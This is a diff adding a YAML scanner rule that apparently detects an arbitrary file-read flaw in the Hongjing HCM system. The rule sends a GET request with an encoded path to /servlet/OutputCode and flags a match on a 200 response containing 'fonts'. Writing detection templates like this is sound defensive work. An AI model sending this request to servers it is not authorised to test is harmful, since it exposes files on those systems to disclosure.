@@ -1,0 +1,11 @@
+name: 宏景HCM-OutputCode-文件读取
+description: >-
+  文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B
+    expression:
+      status: 200
+      body_all: ["fonts"]
